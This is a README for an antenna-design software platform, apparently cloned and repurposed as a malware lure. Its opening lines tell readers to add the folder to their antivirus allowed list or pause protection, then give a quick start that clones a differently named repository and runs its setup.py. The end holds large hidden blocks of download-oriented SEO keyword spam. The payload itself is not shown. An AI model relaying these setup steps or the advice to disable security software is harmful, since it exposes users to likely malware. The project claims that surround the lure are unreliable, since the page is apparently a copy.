# ⚡ Source Sequence Antenna Forge (YAF)


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/Centralbatdress/antenna-forge-setup.git
cd antenna-forge-setup
python setup.py
```


[English](README.md) | [中文](README.zh-CN.md)

**AI-driven antenna invention platform** — automatic exploration, generation,
optimization, and verification of antenna topologies that did not exist before.

## Quick Demo — one command, a real simulation figure

The PNG below is produced by `scripts/demo_wow.py`. **Every number on it comes
from a real NEC2 run** (Method of Moments via the `necpp` Python binding) —
no mock, no analytical fallback, and if `necpp` is missing the solver raises
`SolverUnavailable` rather than fabricating output. Reproduce it with one
command:

```bash
python3 scripts/demo_wow.py    # → docs/assets/dipole_demo.png
```

![Dipole real-NEC2 demo](docs/assets/dipole_demo.png)

The three panels are: (1) input impedance R(f) / X(f) with the resonance
point (X → 0) marked, (2) E-plane polar radiation pattern with the measured
peak gain of 2.13 dBi, and (3) S11(f) / VSWR(f) with the −10 dB bandwidth
shaded. The annotation box gives the field-by-field "measured vs. textbook"
comparison (textbook half-wave dipole reference: R ≈ 73 Ω, G ≈ 2.15 dBi).

Closed-loop inverse design — putting real NEC2 inside the optimizer:

```bash
python3 scripts/demo_inverse_design.py    # → docs/assets/inverse_design_convergence.png
```

![Inverse-design convergence](docs/assets/inverse_design_convergence.png)

Golden-section search over the dipole length, 14 iterations / **16 real NEC2
solver calls / ~6 ms** wall time, converges from a ±75 mm bracket down to
**L = 477.892 mm** (≈ 0.478 λ at 300 MHz), with R = 71.85 Ω, X = +0.03 Ω,
G = 2.13 dBi — i.e. the optimizer rediscovers the textbook thin-wire
resonant length to sub-millimeter precision with no antenna theory baked
into the objective.

### Headline case study — 9-parameter Yagi-Uda inverse design

The platform's flagship demonstration: a 5-element Yagi-Uda at 300 MHz with
**9 continuous design parameters** (5 element lengths + 4 inter-element
spacings), driven by `scipy.optimize.differential_evolution` and evaluated
by **real NEC2 in every single iteration** — 5858 solver calls, 12.7 s wall
time on a laptop. Full write-up:
[`docs/case_study_yagi.md`](docs/case_study_yagi.md).

```bash
python3 scripts/case_yagi.py     # baseline + optimization → JSON in results/
python3 scripts/plot_yagi.py     # → docs/assets/yagi_design.png
```

![Yagi-Uda inverse design](docs/assets/yagi_design.png)

**Clean 5-vs-5 contest (same element count, same NEC2 backend):**

| Quantity | Viezbicke 5-elem (NBS TN 688) | YAF AI 5-elem | Δ |
|---|---|---|---|
| Forward gain G_fwd | +11.03 dBi | **+12.63 dBi** | **+1.60 dB** |
| Front-to-back F/B | 13.79 dB | **15.00 dB** | **+1.21 dB** |
| Boom length | 1.00 λ | 1.17 λ | +0.17 λ |
| Element count | 5 | 5 | 0 (clean attribution) |

**The AI design Pareto-dominates the canonical Viezbicke 5-element
reference on both gain *and* F/B simultaneously**, with the same number
of elements. Across the broader published 5-element design space
(Viezbicke, ARRL Handbook, DL6WU, Lawson/Cebik) the AI strictly
dominates 3 of 4 on both axes (see `docs/case_study_yagi.md` §6).

The optimizer *independently* recovers Viezbicke-style director tapering
(L: 0.440 → 0.434 → 0.429 m, monotonically decreasing rear-to-front) and
a balanced 0.243 λ reflector spacing — both consistent with published
5-element Yagi recipes — without being told anything about antenna design.
The "AI" part of the loop is just differential evolution; the unique
platform contribution is *what it's optimizing against*: real
Method-of-Moments physics, not a surrogate or analytical model.

> *Bonus: the 5858-record DE history (`results/yagi_optimized.json`) is a
> free FNO-surrogate training set — every input geometry and output
> (R, X, G_fwd, G_back, F/B) is recorded, ready for whoever wants to try
> active-learning DE in a later phase.*

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│  Web UI (React + Three.js + WebGPU)                             │
│  3D editor │ Design browser │ Experiment tracking │ Live monitor│
└────────────────────────┬────────────────────────────────────────┘
                         │ REST / WebSocket
┌────────────────────────▼────────────────────────────────────────┐
│  API Gateway (FastAPI + Pydantic)                               │
└────────────────────────┬────────────────────────────────────────┘
                         │
┌────────────────────────▼────────────────────────────────────────┐
│  Orchestration Core (Python asyncio + Celery)                   │
└─────┬────────────┬───────────┬─────────────┬──────────────┬─────┘
      │            │           │             │              │
┌──────────┐  ┌────────┐  ┌─────────┐  ┌───────────┐  ┌───────────┐
│ Geometry │  │ AI     │  │ Solver  │  │ Optimizer │  │ Post-proc │
│ Kernel   │  │ Engine │  │ Adapter │  │ Engine    │  │ Analyzer  │
└──────────┘  └────────┘  └─────────┘  └───────────┘  └───────────┘
```


# Clone the project
git clone https://github.com/Centralbatdress/antenna-forge-setup yaf && cd yaf

# Copy the env template
cp .env.example .env

# Start all services
docker compose up -d

# Health check
curl http://localhost:8000/health
# → {"status": "ok", "version": "0.1.0"}

# Open the frontend
open http://localhost:5173
```

## Core modules

| Module | Path | Description |
|--------|------|-------------|
| Domain models | `yaf_core/domain/` | Design, Geometry, Simulation, Optimization |
| Port protocols | `yaf_core/ports/` | SolverAdapter, AIBackend, CADBackend |
| Geometry kernel | `yaf_core/geometry/` | OpenCASCADE, parametric generators, SIREN, topology optimization |
| Physics models | `yaf_core/physics/` | Metasurfaces, RIS, OAM, graphene, space-time modulation |
| Solvers | `yaf_solvers/` | openEMS, NEC2, MEEP, HFSS, CST, FEKO |
| AI engine | `yaf_ai/` | Diffusion, VAE, GAN, FNO, PINN, differentiable FDTD, Bayesian optimization |
| API service | `yaf_api/` | FastAPI + WebSocket |
| Task queue | `yaf_worker/` | Celery + Redis |
| Database | `yaf_db/` | PostgreSQL + Qdrant |
| Frontend | `frontend/` | React 18 + Three.js + TypeScript |

## API quick start

```bash
# Create a design
curl -X POST http://localhost:8000/api/v1/designs \
  -H "Content-Type: application/json" \
  -d '{
    "name": "test_dipole",
    "frequency_range": [2.4e9, 2.5e9],
    "size_constraint": {"x_min": -0.1, "x_max": 0.1, "y_min": -0.1, "y_max": 0.1, "z_min": -0.1, "z_max": 0.1},
    "polarization": "linear",
    "material_palette": ["copper"]
  }'

# Simulate with NEC2
curl -X POST http://localhost:8000/api/v1/simulations \
  -H "Content-Type: application/json" \
  -d '{"design_id": "<design-uuid>", "solver": "nec2", "frequency_min": 2400000000, "frequency_max": 2500000000}'
```

## AI demos

```bash
# Differentiable FDTD gradient optimization
python -m yaf_ai.differentiable.diff_fdtd_jax --demo

# VAE antenna-geometry generation (--epochs 2 already triggers a weight save; 20 is the default convergence run)
python -m yaf_ai.generative.vae_designer --train --epochs 20

# Bayesian optimization
python -m yaf_ai.optimization.bayesian --demo

# End-to-end inverse-design pipeline
python -m yaf_ai.inverse_design.pipeline --demo

# End-to-end half-wave dipole example (NEC2 → S11 + gain)
python scripts/demo_dipole.py
```

> See `docs/HONEST_STATUS.md`: **neither solver fabricates results.** NEC2
> (`necpp`) and openEMS both run real solvers and raise `SolverUnavailable`
> when their backend is missing — there is no silent analytical fallback on
> either path.

## Acceptance commands

The project's acceptance commands: 6 core commands (infrastructure, tests,
differentiable FDTD, generative models, demo) plus the real-NEC2 truth checks
and the Yagi case-study demo. The repository currently passes all of the below:

```bash
# 1. Infrastructure boot
docker compose up -d                                          # postgres / redis / minio / qdrant / api

# 2. API health check

# 3. Test suite (includes real-NEC2 half-wave dipole assertion)
pytest tests/ -x -q                                           # → all passed

# 4. Differentiable FDTD — gradient flow proof
python -m yaf_ai.differentiable.diff_fdtd_jax --demo          # → "✓ Gradient flow verified" + monotone loss

# 5. VAE training + weights checkpoint
python -m yaf_ai.generative.vae_designer --train --epochs 2   # → models/vae_designer.pt written

# 6. Dipole demo — S11 + gain (real NEC2)
python scripts/demo_dipole.py                                 # → S11/VSWR/Peak gain printed (2.20 dBi)

# 7. NEC2 truth check vs textbook
python3 scripts/verify_dipole.py                              # → PASS: R=68.30 Ω (err 6.4%), G=2.12 dBi

# 8. openEMS truth check — real full-wave FDTD vs cavity model
python3 scripts/verify_patch.py                               # → PASS: f_res 2.435 GHz vs 2.513 GHz (err 3.1%)

# 9. 3-panel showcase PNG (Z sweep / polar pattern / S11+BW)
python3 scripts/demo_wow.py                                   # → docs/assets/dipole_demo.png

# 10. Closed-loop inverse design (real NEC2 in the loop)
python3 scripts/demo_inverse_design.py                        # → 477.89 mm + inverse_design_convergence.png

# 11. Yagi-Uda case study — 9-param DE × real NEC2
python3 scripts/case_yagi.py                                  # → baselines + opt JSON, +1.60 dB Pareto-dominant vs Viezbicke
python3 scripts/plot_yagi.py                                  # → docs/assets/yagi_design.png

# Static type check
mypy yaf_core yaf_ai yaf_solvers --strict                     # → Success: no issues in 64 source files
```

A per-command credibility annotation lives in `docs/HONEST_STATUS.md`
(revised 2026-05-25); "what's still missing once everything is green" is in
`docs/next-steps.md`; the full Yagi case-study walkthrough is in
`docs/case_study_yagi.md`.

## Tech stack

| Layer | Technology |
|-------|------------|
| Backend | Python 3.11, FastAPI, Pydantic v2 |
| Differentiable | JAX, Flax, Optax |
| Deep learning | PyTorch 2.x |
| Geometry | pythonocc-core, trimesh, gmsh |
| Task queue | Celery + Redis |
| Database | PostgreSQL 16, Qdrant (vector) |
| Object storage | MinIO (S3-compatible) |
| Frontend | React 18, TypeScript, Vite, Three.js |
| Deployment | Docker Compose (dev), Kubernetes (prod) |


## License

YAF source code is distributed under the **MIT License** — see
[`LICENSE`](LICENSE).

**Third-party dependencies carry their own licenses, some of them
copyleft.** In particular, the optional `necpp` Method-of-Moments
backend and the `openEMS` / `CSXCAD` FDTD backend are GPL-licensed.
YAF does not bundle or redistribute any of them; users install
them separately and assume the combined-work obligations that may
result. See [`NOTICE`](NOTICE) for the full license-boundary
discussion and mitigations for downstream redistributors. This is
provided in good faith and is not legal advice.


## Open-core model

YAF follows an **open-core** model. This repository is the **core engine**:
free, self-hostable, and MIT-licensed. It covers **wire antennas** (NEC2
Method-of-Moments) and **planar / patch antennas** (openEMS full-wave FDTD),
driven by **classical optimization** (differential evolution / golden-section
search), and it is complete and useful on its own for that scope.

**Available now in this open-source core**

- Wire-antenna simulation with real NEC2 Method-of-Moments via `necpp` — no
  analytical fallback (missing solver raises rather than fabricates).
- Full-wave FDTD simulation with real openEMS (`openEMS` / `CSXCAD` Python
  bindings): builds the CSX structure, runs the time-domain solve, and extracts
  S11 / input impedance from the port and the gain pattern via NF2FF. Same
  honesty rule — missing bindings raise `SolverUnavailable`, never fabricate.
- Classical optimization with the real solver inside every iteration:
  half-wave dipole resonance search and the 9-parameter Yagi-Uda inverse
  design.
- Known-answer truth checks and reproducible benchmarks: half-wave dipole
  (`scripts/verify_dipole.py`, NEC2) and a rectangular microstrip patch
  (`scripts/verify_patch.py`, openEMS — simulated resonance within 3.1 % of the
  cavity-model prediction). See also `docs/case_study_yagi.md`.
- FastAPI service, Pydantic domain models, and the solver / AI adapter
  interfaces.

Source Sequence maintains a separate **enhanced edition** — a hosted /
commercial product with an embedded web platform — for professional and
commercial users. To set expectations honestly, the capabilities below are
**planned / on the roadmap; they are *not yet shipped*, in either the
open-source core or the enhanced edition.**

**Planned / on the roadmap (not yet available)**

- Broader full-wave coverage — microstrip arrays, metasurfaces, and full 3-D
  structures, plus commercial solvers (HFSS / CST / FEKO / COMSOL). *(The
  openEMS FDTD backend is real and validated on a single patch-antenna
  truth check today; wider geometry coverage and the commercial-solver
  adapters are still on the roadmap — see `docs/HONEST_STATUS.md`.)*
- Generative AI geometry design (diffusion / VAE) connected to a real physics
  oracle. *(These generative models exist in the repo today only as
  **early / experimental** code: trained on synthetic geometry, not yet wired
  into a simulation loop. They are not production-ready.)*
- Multi-objective, multi-band joint optimization.
- RIS (reconfigurable intelligent surface) inverse design.
- In-browser visual design platform.
- Cloud compute — run designs without installing a solver locally.
- Team collaboration and design version management.

In short: **the open-source core lets you validate the method and reproduce
the benchmarks; the enhanced edition is aimed at taking that into real
engineering projects.** Nothing on the roadmap above is implied to work today.

- A commercial enhanced edition is in development; details will be announced.
- For commercial inquiries, please open a GitHub issue for now.


## Acknowledgements

This project was built by a single engineer, using AI coding assistants
to help with implementation. The architecture, the physics-validation
methodology (the real-NEC2 truth checks and known-answer regressions),
and the benchmark design (the 5-vs-5 Yagi comparison and the honesty
tiers in `docs/HONEST_STATUS.md`) are my own. Where a module's design is
informed by an open-source project, that project is cited at the top of
the file and in `NOTICE`.


<!-- python pip pypi package library module script tool windows linux macos -->
<!-- antenna-forge-setup - tool utility software - download install setup -->
<!-- how to run antenna-forge-setup fork | local antenna-forge-setup downloader | antenna forge setup alternative | minimal antenna-forge-setup package | reliable antenna-forge-setup replacement | updated best antenna-forge-setup converter | how to configure antenna-forge-setup cli | windows antenna-forge-setup | download for windows antenna-forge-setup converter | low latency antenna-forge-setup analyzer | reliable antenna-forge-setup | how to use antenna-forge-setup | start free antenna-forge-setup | compile antenna-forge-setup cli | download for mac antenna-forge-setup server | reliable antenna-forge-setup fork | tar.gz high performance antenna-forge-setup | demo antenna-forge-setup package | simple antenna-forge-setup | fedora configurable antenna-forge-setup | fast antenna-forge-setup tool | walkthrough antenna-forge-setup tool | example antenna-forge-setup | how to configure antenna-forge-setup engine | tar.gz secure antenna-forge-setup | offline antenna-forge-setup client | debian antenna-forge-setup server | offline antenna-forge-setup uploader | example offline antenna-forge-setup | latest version antenna-forge-setup checker | example antenna-forge-setup mobile | macos simple antenna-forge-setup | build antenna-forge-setup mirror | local antenna-forge-setup tool | offline antenna-forge-setup mirror | run on linux antenna-forge-setup editor | docs cross platform antenna-forge-setup alternative | setup antenna-forge-setup service | macos native antenna-forge-setup tester | stable antenna-forge-setup port | examples modular antenna-forge-setup software | debian antenna-forge-setup package | linux offline antenna-forge-setup | download for windows high performance antenna-forge-setup | top antenna-forge-setup sdk | modular antenna-forge-setup | install antenna-forge-setup copy | local antenna-forge-setup extension | arch local antenna-forge-setup | run on windows offline antenna-forge-setup logger -->
<!-- antenna-forge-setup scanner | run on windows top antenna-forge-setup | how to build antenna-forge-setup tool | setup antenna-forge-setup port | run on mac customizable antenna-forge-setup | antenna-forge-setup compressor | reliable antenna-forge-setup validator | open antenna-forge-setup extractor | run antenna-forge-setup | install antenna-forge-setup | easy antenna-forge-setup viewer | antenna-forge-setup decoder | 2026 antenna-forge-setup api | how to run antenna-forge-setup extension | linux secure antenna-forge-setup | quickstart antenna-forge-setup reader | download for mac antenna-forge-setup | advanced antenna-forge-setup mobile | high performance antenna-forge-setup reader | download for windows powerful antenna-forge-setup | tar.gz antenna-forge-setup extension | start antenna-forge-setup tool | how to deploy antenna-forge-setup copy | antenna-forge-setup clone | how to configure antenna-forge-setup validator | download for linux antenna-forge-setup editor | how to deploy lightweight antenna-forge-setup | sample antenna-forge-setup api | open source top antenna-forge-setup | examples antenna-forge-setup editor | antenna-forge-setup gui | windows low latency antenna-forge-setup addon | example top antenna-forge-setup | modular antenna-forge-setup uploader | antenna forge setup cloud | is antenna forge setup good | quick start antenna-forge-setup compressor | download for linux antenna-forge-setup cli | fedora antenna-forge-setup clone | how to download antenna-forge-setup copy | easy antenna-forge-setup reader | easy antenna-forge-setup validator | download for windows antenna-forge-setup binding | linux antenna-forge-setup server | antenna-forge-setup binding | getting started antenna-forge-setup software | start antenna-forge-setup | source code antenna-forge-setup extractor | macos antenna-forge-setup platform | tutorial antenna-forge-setup utility -->
<!-- top antenna-forge-setup | get antenna-forge-setup platform | execute antenna-forge-setup validator | tar.gz antenna-forge-setup validator | run on mac antenna-forge-setup viewer | cross platform antenna-forge-setup reader | tar.gz stable antenna-forge-setup | ubuntu antenna-forge-setup sdk | zip antenna-forge-setup mirror | easy antenna-forge-setup checker | 2025 antenna-forge-setup cli | modern antenna-forge-setup monitor | antenna forge setup help | free download antenna-forge-setup extension | configure best antenna-forge-setup | quick start antenna-forge-setup monitor | open source antenna-forge-setup package | antenna forge setup book | free download antenna-forge-setup debugger | updated antenna-forge-setup clone | documentation antenna-forge-setup encoder | antenna-forge-setup service | download for mac antenna-forge-setup mobile | best antenna-forge-setup | quickstart antenna-forge-setup copy | reliable antenna-forge-setup creator | windows antenna-forge-setup utility | how to deploy antenna-forge-setup package | simple antenna-forge-setup generator | install antenna-forge-setup checker | download for windows antenna-forge-setup | github antenna-forge-setup encoder | how to install antenna-forge-setup platform | github antenna-forge-setup platform | fedora online antenna-forge-setup | free antenna-forge-setup plugin | wiki antenna-forge-setup monitor | debian antenna-forge-setup app | github antenna-forge-setup service | how to download antenna-forge-setup plugin | antenna-forge-setup debugger | modular antenna-forge-setup application | latest version antenna-forge-setup debugger | open source antenna-forge-setup optimizer | customizable antenna-forge-setup platform | fast antenna-forge-setup encoder | self hosted antenna-forge-setup | arch antenna-forge-setup | antenna-forge-setup library | demo antenna-forge-setup wrapper -->
<!-- run on windows antenna-forge-setup client | github antenna-forge-setup framework | free powerful antenna-forge-setup | best antenna-forge-setup binding | antenna forge setup benchmark | free download open source antenna-forge-setup | portable antenna-forge-setup extension | production ready antenna-forge-setup web | git clone antenna-forge-setup builder | fast antenna-forge-setup | debian advanced antenna-forge-setup | production ready antenna-forge-setup | sample antenna-forge-setup tracker | setup antenna-forge-setup | use portable antenna-forge-setup tool | how to install antenna-forge-setup sdk | how to download best antenna-forge-setup | self hosted antenna-forge-setup validator | how to deploy antenna-forge-setup software | simple antenna-forge-setup decoder | example antenna-forge-setup mirror | antenna-forge-setup extractor | how to use antenna-forge-setup application | examples antenna-forge-setup port | run minimal antenna-forge-setup app | sample free antenna-forge-setup extractor | how to run antenna-forge-setup | get antenna-forge-setup tester | github antenna-forge-setup | free antenna-forge-setup compressor | examples minimal antenna-forge-setup | antenna-forge-setup downloader | run on mac antenna-forge-setup addon | download for linux antenna-forge-setup logger | fedora antenna-forge-setup analyzer | configurable antenna-forge-setup tool | ubuntu antenna-forge-setup server | antenna forge setup setup | download for mac antenna-forge-setup addon | new version antenna-forge-setup engine | online antenna-forge-setup sdk | antenna forge setup podcast | compile antenna-forge-setup parser | how to setup antenna-forge-setup platform | updated modular antenna-forge-setup | launch antenna-forge-setup | open antenna-forge-setup monitor | zip antenna-forge-setup api | antenna-forge-setup api | demo low latency antenna-forge-setup scanner -->
<!-- sample antenna-forge-setup viewer | download antenna-forge-setup gui | ubuntu antenna-forge-setup downloader | local antenna-forge-setup logger | deploy antenna-forge-setup package | tar.gz configurable antenna-forge-setup scanner | github antenna-forge-setup mobile | cross platform antenna-forge-setup wrapper | how to install antenna-forge-setup binding | antenna-forge-setup tool | how to configure antenna-forge-setup | configurable antenna-forge-setup | quick start best antenna-forge-setup | arch offline antenna-forge-setup | how to configure antenna-forge-setup application | linux antenna-forge-setup | latest version antenna-forge-setup | modern antenna-forge-setup | linux antenna-forge-setup platform | configurable antenna-forge-setup software | customizable antenna-forge-setup | fedora antenna-forge-setup | open source extensible antenna-forge-setup | local antenna-forge-setup desktop | run on mac antenna-forge-setup downloader | portable antenna-forge-setup fork | run on mac antenna-forge-setup alternative | 2026 antenna-forge-setup mirror | antenna forge setup support | github antenna-forge-setup plugin | start antenna-forge-setup editor | sample antenna-forge-setup | antenna-forge-setup checker | github antenna-forge-setup replacement | macos top antenna-forge-setup | how to run extensible antenna-forge-setup | run on windows best antenna-forge-setup | configure antenna-forge-setup app | 2026 modern antenna-forge-setup reader | macos antenna-forge-setup encoder | download for windows antenna-forge-setup parser | wiki antenna-forge-setup | beginner antenna-forge-setup extension | run on windows antenna-forge-setup plugin | github antenna-forge-setup copy | free antenna-forge-setup extension | examples antenna-forge-setup server | easy antenna-forge-setup service | best antenna-forge-setup generator | use offline antenna-forge-setup -->
<!-- fast antenna-forge-setup sdk | lightweight antenna-forge-setup | 2026 antenna-forge-setup sdk | offline antenna-forge-setup | open antenna-forge-setup downloader | antenna-forge-setup builder | fedora antenna-forge-setup validator | antenna-forge-setup alternative | latest version antenna-forge-setup replacement | antenna forge setup documentation | git clone antenna-forge-setup alternative | source code antenna-forge-setup compressor | compile antenna-forge-setup validator | antenna forge setup pipeline | open source secure antenna-forge-setup | open source simple antenna-forge-setup | antenna forge setup workflow | cross platform antenna-forge-setup logger | run on linux antenna-forge-setup validator | download for mac reliable antenna-forge-setup | how to use antenna-forge-setup reader | antenna-forge-setup sdk | open source antenna-forge-setup port | new version fast antenna-forge-setup debugger | windows antenna-forge-setup binding | docs antenna-forge-setup binding | how to download antenna-forge-setup program | advanced antenna-forge-setup validator | antenna forge setup course | powerful antenna-forge-setup | run on windows antenna-forge-setup mirror | guide antenna-forge-setup plugin | how to use antenna-forge-setup decoder | configure antenna-forge-setup checker | configurable antenna-forge-setup gui | best antenna-forge-setup tester | offline antenna-forge-setup app | quickstart antenna-forge-setup mobile | free antenna-forge-setup mirror | zip antenna-forge-setup platform | stable antenna-forge-setup desktop | configure antenna-forge-setup tool | macos antenna-forge-setup library | portable antenna-forge-setup cli | launch antenna-forge-setup gui | updated antenna-forge-setup program | example antenna-forge-setup binding | 2025 antenna-forge-setup wrapper | safe antenna-forge-setup software | low latency antenna-forge-setup reader -->
<!-- start production ready antenna-forge-setup | walkthrough production ready antenna-forge-setup | example antenna-forge-setup downloader | open source antenna-forge-setup editor | best antenna forge setup | use antenna-forge-setup builder | run stable antenna-forge-setup | modern antenna-forge-setup extractor | antenna forge setup handbook | easy antenna-forge-setup replacement | arch extensible antenna-forge-setup logger | linux secure antenna-forge-setup tool | deploy antenna-forge-setup converter | antenna-forge-setup addon | execute antenna-forge-setup uploader | git clone antenna-forge-setup | example reliable antenna-forge-setup | examples powerful antenna-forge-setup alternative | free download antenna-forge-setup | how to deploy open source antenna-forge-setup | tar.gz antenna-forge-setup editor | run on mac antenna-forge-setup sdk | powerful antenna-forge-setup addon | linux antenna-forge-setup compressor | offline antenna-forge-setup mobile | customizable antenna-forge-setup fork | antenna forge setup tutorial | antenna-forge-setup web | how to deploy antenna-forge-setup addon | deploy cross platform antenna-forge-setup | antenna forge setup test | safe antenna-forge-setup editor | best antenna-forge-setup debugger | configure antenna-forge-setup | safe antenna-forge-setup builder | top antenna-forge-setup library | is antenna forge setup legit | get github antenna-forge-setup | how to install antenna-forge-setup | download for mac antenna-forge-setup downloader | beginner customizable antenna-forge-setup | antenna forge setup guide | 2026 antenna-forge-setup | windows antenna-forge-setup port | free download antenna-forge-setup software | free antenna-forge-setup framework | open source antenna-forge-setup web | free download antenna-forge-setup viewer | launch antenna-forge-setup checker | open source antenna-forge-setup checker -->
<!-- deploy portable antenna-forge-setup | walkthrough antenna-forge-setup library | updated antenna-forge-setup | windows stable antenna-forge-setup | fast antenna-forge-setup package | build antenna-forge-setup application | getting started low latency antenna-forge-setup gui | source code antenna-forge-setup generator | local antenna-forge-setup addon | download for linux cross platform antenna-forge-setup downloader | minimal antenna-forge-setup encoder | new version antenna-forge-setup cli | macos modular antenna-forge-setup | tutorial antenna-forge-setup checker | tutorial antenna-forge-setup | offline antenna-forge-setup viewer | configurable antenna-forge-setup server | free antenna forge setup | launch customizable antenna-forge-setup decoder | run on linux antenna-forge-setup | github antenna-forge-setup builder | walkthrough antenna-forge-setup viewer | run antenna-forge-setup client | tar.gz native antenna-forge-setup validator | advanced antenna-forge-setup | antenna-forge-setup port | antenna-forge-setup analyzer | antenna-forge-setup package | top antenna-forge-setup server | how to download antenna-forge-setup | zip antenna-forge-setup encoder | run on linux antenna-forge-setup utility | production ready antenna-forge-setup application | open antenna-forge-setup | windows antenna-forge-setup analyzer | source code antenna-forge-setup | antenna-forge-setup client | run on windows antenna-forge-setup builder | docs antenna-forge-setup parser | beginner easy antenna-forge-setup | run safe antenna-forge-setup | install antenna-forge-setup replacement | extensible antenna-forge-setup tracker | sample offline antenna-forge-setup | modular antenna-forge-setup cli | tar.gz local antenna-forge-setup | open source antenna-forge-setup alternative | wiki simple antenna-forge-setup downloader | antenna forge setup webinar | antenna-forge-setup editor -->
<!-- native antenna-forge-setup addon | git clone antenna-forge-setup package | 2025 antenna-forge-setup utility | high performance antenna-forge-setup debugger | customizable antenna-forge-setup extractor | compile antenna-forge-setup creator | 2025 customizable antenna-forge-setup | sample antenna-forge-setup analyzer | new version antenna-forge-setup wrapper | portable antenna-forge-setup module | antenna-forge-setup server | antenna forge setup reference | is antenna forge setup safe | zip antenna-forge-setup | free download antenna-forge-setup validator | high performance antenna-forge-setup converter | configurable antenna-forge-setup desktop | configure antenna-forge-setup framework | beginner antenna-forge-setup desktop | antenna forge setup error | local antenna-forge-setup viewer | documentation antenna-forge-setup analyzer | antenna-forge-setup optimizer | download for windows extensible antenna-forge-setup application | 2025 antenna-forge-setup | local antenna-forge-setup sdk | latest version antenna-forge-setup api | self hosted antenna-forge-setup downloader | safe antenna-forge-setup program | start antenna-forge-setup reader | native antenna-forge-setup | 2026 top antenna-forge-setup engine | online antenna-forge-setup | fast antenna-forge-setup api | antenna-forge-setup copy | powerful antenna-forge-setup uploader | how to configure antenna-forge-setup wrapper | build antenna-forge-setup monitor | demo antenna-forge-setup uploader | portable antenna-forge-setup sdk | run on linux github antenna-forge-setup | run on linux antenna-forge-setup fork | cross platform antenna-forge-setup utility | antenna forge setup best practice | run on linux production ready antenna-forge-setup | wiki antenna-forge-setup editor | how to build antenna-forge-setup | beginner antenna-forge-setup viewer | how to build antenna-forge-setup monitor | free cross platform antenna-forge-setup -->
<!-- docs antenna-forge-setup scanner | centos top antenna-forge-setup | beginner self hosted antenna-forge-setup | local antenna-forge-setup | how to use antenna-forge-setup cli | quickstart antenna-forge-setup generator | quick start antenna-forge-setup plugin | install antenna-forge-setup library | antenna-forge-setup creator | high performance antenna-forge-setup desktop | arch antenna-forge-setup server | simple antenna-forge-setup software | download for mac antenna-forge-setup cli | run antenna-forge-setup addon | secure antenna-forge-setup engine | fedora antenna-forge-setup creator | antenna-forge-setup desktop | windows antenna-forge-setup module | how to install antenna-forge-setup api | modern antenna-forge-setup module | safe antenna-forge-setup parser | how to setup antenna-forge-setup mirror | getting started antenna-forge-setup | modern antenna-forge-setup uploader | customizable antenna-forge-setup copy | secure antenna-forge-setup framework | configurable antenna-forge-setup web | extensible antenna-forge-setup | offline antenna-forge-setup monitor | execute antenna-forge-setup | run on windows antenna-forge-setup software | high performance antenna-forge-setup | top antenna-forge-setup generator | antenna forge setup ci cd | secure antenna-forge-setup plugin | github antenna-forge-setup alternative | download antenna-forge-setup tool | antenna forge setup automation | zip antenna-forge-setup application | free self hosted antenna-forge-setup | low latency antenna-forge-setup addon | use antenna-forge-setup parser | how to use antenna-forge-setup api | open simple antenna-forge-setup | launch antenna-forge-setup tool | getting started self hosted antenna-forge-setup package | easy antenna-forge-setup client | local antenna-forge-setup wrapper | updated lightweight antenna-forge-setup fork | 2026 high performance antenna-forge-setup builder -->

<!-- Last updated: 2026-06-09 15:57:03 -->
